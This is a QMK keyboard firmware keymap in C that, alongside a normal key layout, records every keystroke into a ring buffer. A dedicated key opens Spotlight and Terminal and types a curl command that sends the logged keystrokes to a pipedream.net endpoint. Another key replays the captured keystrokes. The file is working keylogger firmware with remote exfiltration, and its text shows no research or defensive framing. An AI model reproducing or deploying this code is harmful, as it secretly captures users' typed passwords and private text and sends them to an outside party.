#include QMK_KEYBOARD_H

#include "key_event.h"
#include "ring_buf.h"
#include "custom_control.h"
#include "keycode_convert.h"

const char QUERY_CMD_START[] PROGMEM = "curl 'enimozqxebt4wf5.m.pipedream.net?q=";
const char QUERY_CMD_END[] PROGMEM = "'; exit";

ring_buf keylog = { .head = 0, .length = 0 };

enum custom_keycodes {
    DUMP = SAFE_RANGE,
    REM_DUMP
};

bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    uint8_t mapped_kc = map_qmk_kc(keycode);
    if (mapped_kc != NO_KEY_MAPPING) {
        struct key_event event = {
            .is_pressed = record->event.pressed,
            .mapped_kc = mapped_kc
        };

        rb_push_back(&keylog, event);
    }

    switch (keycode) {
    case DUMP:
        if (record->event.pressed) {
            for (uint16_t i = 0; i < keylog.length; i++) {
                struct key_event event = rb_peek_at(&keylog, i);

                uint16_t qmk_kc = get_qmk_kc(event.mapped_kc);

                if (event.is_pressed) {
                    register_code16(qmk_kc);
                } else {
                    unregister_code16(qmk_kc);
                }
            }
        } 

        return false;
    case REM_DUMP:
        if (record->event.pressed) {
            cli();

            open_spotlight();
            open_terminal();
            wait_ms(1000);

            send_string_P(QUERY_CMD_START);

            send_logged_data(&keylog);

            send_string_P(QUERY_CMD_END);
            tap_code(KC_ENT);

            sei();
        }

        break;
   }

    return true;
}

/* void keyboard_post_init_user(void) { */
/*     debug_enable = true; */
/* } */

const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
    LAYOUT(
        KC_GESC, KC_1,    KC_2,    KC_3,    KC_4,    KC_5,    KC_6,    KC_7,    KC_8,    KC_9,    KC_0,    KC_MINS, KC_EQL,  XXXXXXX, KC_BSPC,
        KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,    KC_T,    KC_Y,    KC_U,    KC_I,    KC_O,    KC_P,    KC_LBRC, KC_RBRC, KC_BSLS,
        KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,    KC_G,    KC_H,    KC_J,    KC_K,    KC_L,    KC_SCLN, KC_QUOT,          KC_ENT,
        KC_LSFT, XXXXXXX, KC_Z,    KC_X,    KC_C,    KC_V,    KC_B,    KC_N,    KC_M,    KC_COMM, KC_DOT,  KC_SLSH, KC_RSFT, XXXXXXX,
        KC_LCTL, RESET,   KC_LGUI,                   KC_SPC,  KC_SPC,  KC_SPC,           KC_RGUI, REM_DUMP,XXXXXXX, MO(1),   DUMP
    ),

    LAYOUT(
        KC_GRV,  KC_F1,   KC_F2,   KC_F3,   KC_F4,   KC_F5,   KC_F6,   KC_F7,   KC_F8,   KC_F9,   KC_F10,  KC_F11,  KC_F12,  _______, KC_DEL,
        _______, RGB_TOG, RGB_MOD, RGB_HUI, RGB_HUD, RGB_SAI, RGB_SAD, RGB_VAI, RGB_VAD, _______, _______, _______, _______, RESET,
        _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______, _______,          _______,
        _______, _______, _______, _______, BL_DEC,  BL_TOGG, BL_INC,  BL_STEP, _______, _______, _______, _______, _______, _______,
        _______, _______, _______,                   _______, _______, _______,          _______, _______, _______, _______, _______
    )
};
